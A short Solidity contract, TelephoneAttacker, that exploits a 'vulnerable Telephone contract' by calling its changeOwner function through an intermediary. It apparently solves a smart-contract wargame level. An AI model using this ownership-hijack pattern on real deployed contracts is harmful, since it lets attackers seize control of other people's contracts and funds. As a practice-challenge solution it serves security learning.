// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttacker {
    /**
     * @dev Exploits the Telephone contract's vulnerable changeOwner function
     * @param _telephoneAddress Address of the vulnerable Telephone contract
     * @param _newOwner The address that should claim ownership (typically your wallet)
     */
    function attack(address _telephoneAddress, address _newOwner) public {
        // Make a low-level call to the Telephone contract
        (bool success, ) = _telephoneAddress.call(
            // Encode the function call with:
            // - Function signature: "changeOwner(address)"
            // - Parameter: the new owner address
            abi.encodeWithSignature("changeOwner(address)", _newOwner)
        );

        // Ensure the call succeeded, otherwise revert with error
        require(success, "Attack failed");
    }
}
